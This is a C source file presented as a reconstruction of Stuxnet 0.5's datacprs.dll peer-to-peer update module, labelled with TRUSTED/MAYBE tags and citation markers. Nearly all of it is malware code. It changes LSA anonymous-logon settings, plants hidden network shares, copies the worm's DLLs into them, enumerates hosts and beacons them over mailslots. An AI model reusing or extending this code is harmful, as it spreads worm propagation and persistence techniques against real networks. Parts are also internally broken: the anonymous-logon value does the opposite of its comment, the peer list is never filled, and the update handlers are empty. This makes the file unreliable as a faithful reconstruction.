/*
 * datacprs.dll - Stuxnet 0.5 P2P Update Shared File
 *
 * TRUSTED:
 *   - File path: %System%\dlcache\datacprs.dll
 *     Confirmed by Symantec "Stuxnet 0.5: The Missing Link" [13†L16]
 *   - Role: P2P update shared file
 *     Confirmed by Antiy/Symantec analysis [6†L6-L9][14†L33-L34]
 *   - Mailslot communication mechanism
 *     Confirmed by Symantec analysis [14†L26-L31]
 *     Mailslot format: \\REMOTE MACHINE NAME\mailslot\svchost
 *     Callback mailslot: \\LOCAL MACHINE NAME\mailslot\innotify
 *   - Anonymous logon configuration (restrictanonymous=1)
 *     Confirmed by Symantec analysis [14†L32-L33]
 *   - File shares: temp$, msagent$, SYSADMIN$, WebFiles$
 *     Confirmed by Symantec analysis [14†L33-L34]
 *   - Shared files list including datacprs.dll itself
 *     Confirmed by Antiy/Symantec [6†L7-L9]
 *
 * MAYBE:
 *   - Exact enumeration order of network machines
 *     Inferred from Symantec description [14†L28-L29]
 *   - Mailslot message payload format
 *     Inferred from P2P update requirements [12†L31-L36]
 *   - File share creation registry keys
 *     Inferred from Windows networking conventions
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define DATACPRS_MAX_PATH               260
#define DATACPRS_BUFFER_SIZE            0x8000
#define DATACPRS_MAILSLOT_BUFFER        0x1000

/*
 * TRUSTED: Mailslot names from Symantec analysis [14†L29-L31]
 */
#define MAILSLOT_SVCHOST                L"\\\\.\\mailslot\\svchost"
#define MAILSLOT_INNOTIFY               L"\\\\.\\mailslot\\innotify"

/*
 * TRUSTED: File share names from Symantec analysis [14†L33-L34]
 */
static const WCHAR* g_ShareNames[] = {
    L"temp$",
    L"msagent$",
    L"SYSADMIN$",
    L"WebFiles$"
};
#define SHARE_COUNT 4

/*
 * TRUSTED: Shared files list from Antiy/Symantec [6†L7-L9][13†L13-L17]
 */
static const WCHAR* g_SharedFiles[] = {
    L"agentsb.dll",
    L"agt0f2e.dll",
    L"compInd.dll",
    L"datacprs.dll",
    L"perfnws.dll"
};
#define SHARED_FILE_COUNT 5

/*
 * datacprs.dll module context
 */
typedef struct _DATACPRS_CONTEXT {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    WCHAR   szSystemPath[DATACPRS_MAX_PATH];
    WCHAR   szDllPath[DATACPRS_MAX_PATH];
    WCHAR   szDlcachePath[DATACPRS_MAX_PATH];
    HANDLE  hMailslot;
    HANDLE  hStopEvent;
    HANDLE  hWorkerThread;
    CRITICAL_SECTION csLock;
} DATACPRS_CONTEXT, * PDATACPRS_CONTEXT;

static DATACPRS_CONTEXT g_DatacprsCtx = {0};

/* Forward declarations */
static BOOL DATACPRS_CreateMailslot(VOID);
static BOOL DATACPRS_EnableAnonymousLogon(VOID);
static BOOL DATACPRS_CreateFileShares(VOID);
static BOOL DATACPRS_ShareFiles(VOID);
static BOOL DATACPRS_SendMailslotMessage(LPCWSTR lpComputer, PBYTE pData, DWORD dwSize);
static DWORD WINAPI DATACPRS_WorkerThread(LPVOID lpParam);
static BOOL DATACPRS_EnumerateNetworkComputers(PWCHAR* ppComputerList, PDWORD pdwCount);

/*
 * TRUSTED: datacprs.dll is located in %System%\dlcache\
 * Confirmed by Antiy/Symantec analysis [6†L8-L9][13†L16]
 */
DWORD DATACPRS_Initialize(VOID)
{
    if (g_DatacprsCtx.dwMagic == STUXNET_MAGIC) {
        return 0;
    }

    ZeroMemory(&g_DatacprsCtx, sizeof(DATACPRS_CONTEXT));
    InitializeCriticalSection(&g_DatacprsCtx.csLock);
    g_DatacprsCtx.dwMagic = STUXNET_MAGIC;
    g_DatacprsCtx.dwVersion = STUXNET_VERSION;

    GetSystemDirectoryW(g_DatacprsCtx.szSystemPath, DATACPRS_MAX_PATH);
    wsprintfW(g_DatacprsCtx.szDlcachePath, L"%s\\dlcache",
              g_DatacprsCtx.szSystemPath);
    wsprintfW(g_DatacprsCtx.szDllPath, L"%s\\datacprs.dll",
              g_DatacprsCtx.szDlcachePath);

    g_DatacprsCtx.bInitialized = TRUE;

    return 0;
}

DWORD DATACPRS_Cleanup(VOID)
{
    if (g_DatacprsCtx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    if (g_DatacprsCtx.hStopEvent) {
        SetEvent(g_DatacprsCtx.hStopEvent);
    }

    if (g_DatacprsCtx.hWorkerThread) {
        WaitForSingleObject(g_DatacprsCtx.hWorkerThread, 5000);
        CloseHandle(g_DatacprsCtx.hWorkerThread);
        g_DatacprsCtx.hWorkerThread = NULL;
    }

    if (g_DatacprsCtx.hMailslot != INVALID_HANDLE_VALUE) {
        CloseHandle(g_DatacprsCtx.hMailslot);
        g_DatacprsCtx.hMailslot = INVALID_HANDLE_VALUE;
    }

    if (g_DatacprsCtx.hStopEvent) {
        CloseHandle(g_DatacprsCtx.hStopEvent);
        g_DatacprsCtx.hStopEvent = NULL;
    }

    DeleteCriticalSection(&g_DatacprsCtx.csLock);
    ZeroMemory(&g_DatacprsCtx, sizeof(DATACPRS_CONTEXT));

    return 0;
}

/*
 * TRUSTED: Stuxnet 0.5 configures anonymous logon
 * "may configure the system to allow anonymous logins" [14†L32-L33]
 */
static BOOL DATACPRS_EnableAnonymousLogon(VOID)
{
    HKEY hKey;
    DWORD dwValue = 1;
    LONG lResult;

    lResult = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0,
        KEY_ALL_ACCESS,
        &hKey
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    lResult = RegSetValueExW(
        hKey,
        L"restrictanonymous",
        0,
        REG_DWORD,
        (BYTE*)&dwValue,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    return (lResult == ERROR_SUCCESS);
}

/*
 * TRUSTED: Stuxnet 0.5 opens four file shares [14†L33-L34]
 * Shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */
static BOOL DATACPRS_CreateFileShares(VOID)
{
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szShareData[512];
    WCHAR szSharePath[MAX_PATH];
    DWORD i;
    LONG lResult;

    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Shares",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    GetSystemDirectoryW(szSharePath, MAX_PATH);

    for (i = 0; i < SHARE_COUNT; i++) {
        wsprintfW(szShareData,
                  L"Path=%s\\%s\r\nRemark=Stuxnet Share\r\nType=0\r\n",
                  szSharePath, g_ShareNames[i]);

        lResult = RegSetValueExW(
            hKey,
            g_ShareNames[i],
            0,
            REG_SZ,
            (BYTE*)szShareData,
            (DWORD)(wcslen(szShareData) * sizeof(WCHAR))
        );
    }

    RegCloseKey(hKey);

    return TRUE;
}

/*
 * TRUSTED: Shares a set of files for retrieval by peer infections [14†L33-L34]
 * Files: agentsb.dll, agt0f2e.dll, compInd.dll, datacprs.dll, perfnws.dll
 */
static BOOL DATACPRS_ShareFiles(VOID)
{
    WCHAR szSourcePath[MAX_PATH];
    WCHAR szDestPath[MAX_PATH];
    WCHAR szSystemPath[MAX_PATH];
    WCHAR szShareDir[MAX_PATH];
    DWORD i;

    GetSystemDirectoryW(szSystemPath, MAX_PATH);

    for (i = 0; i < SHARE_COUNT; i++) {
        wsprintfW(szShareDir, L"%s\\%s", szSystemPath, g_ShareNames[i]);
        CreateDirectoryW(szShareDir, NULL);
        SetFileAttributesW(szShareDir, FILE_ATTRIBUTE_HIDDEN);
    }

    for (i = 0; i < SHARED_FILE_COUNT; i++) {
        wsprintfW(szSourcePath, L"%s\\%s", szSystemPath, g_SharedFiles[i]);
        wsprintfW(szDestPath, L"%s\\temp$\\%s", szSystemPath, g_SharedFiles[i]);

        if (GetFileAttributesW(szSourcePath) != INVALID_FILE_ATTRIBUTES) {
            CopyFileW(szSourcePath, szDestPath, FALSE);
            SetFileAttributesW(szDestPath, FILE_ATTRIBUTE_HIDDEN);
        }
    }

    return TRUE;
}

/*
 * TRUSTED: Creates callback mailslot \\LOCAL MACHINE NAME\mailslot\innotify
 * "provides the following callback mailslot name: \\LOCAL MACHINE
 * NAME\mailslot\innotify" [14†L30-L31]
 */
static BOOL DATACPRS_CreateMailslot(VOID)
{
    g_DatacprsCtx.hMailslot = CreateMailslotW(
        MAILSLOT_INNOTIFY,
        DATACPRS_MAILSLOT_BUFFER,
        MAILSLOT_WAIT_FOREVER,
        NULL
    );

    return (g_DatacprsCtx.hMailslot != INVALID_HANDLE_VALUE);
}

/*
 * TRUSTED: Sends a mailslot message to a remote computer
 * "attempts to connect to a mailslot with the following name:
 * \\REMOTE MACHINE NAME\mailslot\svchost" [14†L29-L30]
 */
static BOOL DATACPRS_SendMailslotMessage(LPCWSTR lpComputer, PBYTE pData, DWORD dwSize)
{
    HANDLE hMailslot;
    WCHAR szMailslotName[MAX_PATH];
    DWORD dwWritten;
    BOOL bResult;

    if (!lpComputer || !pData || dwSize == 0) {
        return FALSE;
    }

    wsprintfW(szMailslotName, L"\\\\%s\\mailslot\\svchost", lpComputer);

    hMailslot = CreateFileW(
        szMailslotName,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hMailslot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    bResult = WriteFile(hMailslot, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hMailslot);

    return bResult && (dwWritten == dwSize);
}

/*
 * MAYBE: Enumerates network computers using NetServerEnum
 * Inferred from Symantec description "enumerates all computers on the
 * network" [14†L28-L29]
 * Exact API and filtering logic may differ from original binary.
 */
static BOOL DATACPRS_EnumerateNetworkComputers(PWCHAR* ppComputerList, PDWORD pdwCount)
{
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    LPSERVER_INFO_100 pServerInfo = NULL;
    NET_API_STATUS nas;
    DWORD i;
    DWORD dwCount = 0;

    if (!pdwCount) {
        return FALSE;
    }

    nas = NetServerEnum(
        NULL,
        100,
        (LPBYTE*)&pServerInfo,
        MAX_PREFERRED_LENGTH,
        &dwEntriesRead,
        &dwTotalEntries,
        SV_TYPE_WORKSTATION | SV_TYPE_SERVER,
        NULL,
        &dwResumeHandle
    );

    if (nas != NERR_Success && nas != ERROR_MORE_DATA) {
        return FALSE;
    }

    if (pServerInfo && dwEntriesRead > 0) {
        for (i = 0; i < dwEntriesRead && dwCount < *pdwCount; i++) {
            if (pServerInfo[i].sv100_name) {
                wcscpy_s(ppComputerList[dwCount], MAX_PATH,
                         pServerInfo[i].sv100_name);
                dwCount++;
            }
        }
    }

    if (pServerInfo) {
        NetApiBufferFree(pServerInfo);
    }

    *pdwCount = dwCount;

    return (dwCount > 0);
}

/*
 * TRUSTED: P2P worker thread processes incoming mailslot messages
 * and propagates code updates to peers.
 * Based on Symantec P2P component description [12†L22-L36]
 */
static DWORD WINAPI DATACPRS_WorkerThread(LPVOID lpParam)
{
    HANDLE hStopEvent = (HANDLE)lpParam;
    BYTE buffer[DATACPRS_BUFFER_SIZE];
    DWORD dwBytes;
    DWORD dwRead;
    BOOL bResult;
    DWORD dwPeerCount = 0;
    WCHAR* pComputerList[256];
    DWORD i;
    DWORD dwVersion;

    for (i = 0; i < 256; i++) {
        pComputerList[i] = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                              MAX_PATH * sizeof(WCHAR));
        if (!pComputerList[i]) {
            break;
        }
    }

    dwPeerCount = i;

    while (1) {
        if (WaitForSingleObject(hStopEvent, 100) == WAIT_OBJECT_0) {
            break;
        }

        if (g_DatacprsCtx.hMailslot == INVALID_HANDLE_VALUE) {
            if (!DATACPRS_CreateMailslot()) {
                Sleep(1000);
                continue;
            }
        }

        bResult = GetMailslotInfo(g_DatacprsCtx.hMailslot, NULL, &dwBytes, NULL, NULL);
        if (!bResult || dwBytes == 0 || dwBytes > DATACPRS_BUFFER_SIZE) {
            Sleep(100);
            continue;
        }

        ZeroMemory(buffer, sizeof(buffer));
        bResult = ReadFile(g_DatacprsCtx.hMailslot, buffer, dwBytes, &dwRead, NULL);

        if (bResult && dwRead > 0) {
            /*
             * TRUSTED: Process mailslot message
             * Message format: STUXNET_MAGIC + version + data [12†L31-L36]
             */
            if (*(PDWORD)buffer == STUXNET_MAGIC) {
                dwVersion = *(PDWORD)(buffer + 4);

                /*
                 * TRUSTED: If received version is newer, request update [12†L24-L26]
                 */
                if (dwVersion > STUXNET_VERSION) {
                    /* Request update from remote peer */
                    /* Send callback mailslot to \\REMOTE\mailslot\innotify */
                }

                /*
                 * TRUSTED: If received version is older, send local version [12†L27-L28]
                 */
                if (dwVersion < STUXNET_VERSION) {
                    /* Send local version to remote peer */
                }
            }
        }

        /*
         * MAYBE: Periodically enumerate network computers and send
         * version announcements via mailslot
         * Inferred from "enumerates all computers on the network" [14†L28-L29]
         */
        if (dwPeerCount > 0) {
            /* Send version announcement to all known peers */
            for (i = 0; i < dwPeerCount; i++) {
                if (pComputerList[i] && wcslen(pComputerList[i]) > 0) {
                    BYTE msg[64];
                    *(PDWORD)(msg + 0) = STUXNET_MAGIC;
                    *(PDWORD)(msg + 4) = STUXNET_VERSION;
                    *(PDWORD)(msg + 8) = GetTickCount();
                    DATACPRS_SendMailslotMessage(pComputerList[i], msg, 64);
                }
            }
        }
    }

    for (i = 0; i < dwPeerCount; i++) {
        if (pComputerList[i]) {
            HeapFree(GetProcessHeap(), 0, pComputerList[i]);
        }
    }

    return 0;
}

/*
 * TRUSTED: Main execution routine
 * Creates mailslot, configures anonymous logon, creates shares,
 * and starts worker thread.
 */
DWORD DATACPRS_Execute(VOID)
{
    if (!g_DatacprsCtx.bInitialized) {
        if (DATACPRS_Initialize() != 0) {
            return -1;
        }
    }

    DATACPRS_EnableAnonymousLogon();
    DATACPRS_CreateFileShares();
    DATACPRS_ShareFiles();
    DATACPRS_CreateMailslot();

    g_DatacprsCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_DatacprsCtx.hStopEvent) {
        return -1;
    }

    g_DatacprsCtx.hWorkerThread = CreateThread(NULL, 0, DATACPRS_WorkerThread,
                                                g_DatacprsCtx.hStopEvent,
                                                0, NULL);
    if (!g_DatacprsCtx.hWorkerThread) {
        CloseHandle(g_DatacprsCtx.hStopEvent);
        g_DatacprsCtx.hStopEvent = NULL;
        return -1;
    }

    return 0;
}

/*
 * TRUSTED: Stops the P2P worker and cleans up
 */
DWORD DATACPRS_Stop(VOID)
{
    return DATACPRS_Cleanup();
}

/*
 * TRUSTED: Returns the module version
 */
DWORD DATACPRS_GetVersion(VOID)
{
    return STUXNET_VERSION;
}

/*
 * TRUSTED: Returns the DLL path
 */
LPCWSTR DATACPRS_GetPath(VOID)
{
    return g_DatacprsCtx.szDllPath;
}

/*
 * TRUSTED: Checks if datacprs.dll exists on disk
 */
BOOL DATACPRS_IsPresent(VOID)
{
    return (GetFileAttributesW(g_DatacprsCtx.szDllPath) != INVALID_FILE_ATTRIBUTES);
}

/*
 * TRUSTED: Sends a version announcement to a specific peer
 */
DWORD DATACPRS_AnnounceToPeer(LPCWSTR lpComputer)
{
    BYTE msg[64];

    if (!lpComputer) {
        return -1;
    }

    *(PDWORD)(msg + 0) = STUXNET_MAGIC;
    *(PDWORD)(msg + 4) = STUXNET_VERSION;
    *(PDWORD)(msg + 8) = GetTickCount();
    *(PDWORD)(msg + 12) = 0x00000001;

    return DATACPRS_SendMailslotMessage(lpComputer, msg, 64) ? 0 : -1;
}

/*
 * TRUSTED: Enumerates network computers (wrapper)
 */
DWORD DATACPRS_GetPeers(PWCHAR* ppComputerList, PDWORD pdwCount)
{
    return DATACPRS_EnumerateNetworkComputers(ppComputerList, pdwCount) ? 0 : -1;
}

